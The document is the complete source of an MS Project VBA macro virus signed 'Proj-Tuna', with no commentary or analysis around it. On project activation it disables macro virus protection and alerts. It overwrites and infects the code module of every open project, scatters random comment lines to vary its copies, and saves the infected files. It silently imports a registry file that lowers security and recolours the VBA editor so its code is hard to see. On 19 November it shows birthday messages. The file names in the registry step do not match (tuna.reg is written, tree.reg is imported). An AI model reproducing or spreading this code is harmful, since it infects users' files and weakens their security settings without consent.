Private Sub Project_Activate(ByVal pj As Project)
'
jubii = Version
If jubii = "8.0" Then
Application.MacroVirusProtection = False
End If
Application.DisplayAlerts = False
Dim X As Project
For Each X In Projects
On Error Resume Next
Set ap = X.VBProject.VBComponents(1).codemodule
Set tp = ThisProject.VBProject.VBComponents(1).codemodule
If ap.lines(2, 1) <> "'" Then
ap.deletelines 1, ap.countoflines
ap.insertlines 1, tp.lines(1, tp.countoflines)
For i = 9 To ap.countoflines
Randomize
ma = Int((Rnd * 8) + 1)
If ma <= 2 Then
ap.insertlines i, "'"
End If
Next i
Application.FileSaveAs Name:=ActiveProject.Name
End If
Next X
Set temp = Application.VBE.VBProjects(1).VBComponents(1).codemodule
If temp.lines(2, 1) <> "'" Then
temp.deletelines 1, temp.countoflines
temp.insertlines 1, tp.lines(1, tp.countoflines)
For n = 9 To temp.countoflines
Randomize
ma = Int((Rnd * 4) + 1)
If temp.lines(n, 1) = "'" And ma >= 2 Then
temp.deletelines n, 1
je = je + 1
If je = 15 Then GoTo out
End If
Next n
out:
If jubii <> "8.0" Then
Open "C:\tuna.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\MS Project\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\VBA\Office]"
Print #1, """CodeForeColors""=""1 1 5 0 1 1 1 1 0 0 0 0 0 0 0 0 """
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\VBA\Office]"
Print #1, """CodeBackColors""=""1 1 0 7 6 0 0 0 0 0 0 0 0 0 0 0 """
Close 1
Shell "regedit /s c:\tree.reg", vbHide
Kill "C:\tuna.reg"
End If
If (Day(Now)) = 19 And (Month(Now)) = 11 Then
MsgBox "Deeper spirals drowning , in seas bluer than you , tape ribbons flutter wet in the sky, Pulling at the loose threads Of your Soul", vbExclamation, "Proj-Tuna - dedicated to a good friend - happy birthday"
End If
If (Day(Now)) = 19 And (Month(Now)) = 11 and hour(now) > 12 Then
MsgBox "Tuna ... its go0d for the Brain!!!", vbExclamation, "But is it good for the tuna??"
End If
End If
'[ast]
'Tuna
End Sub
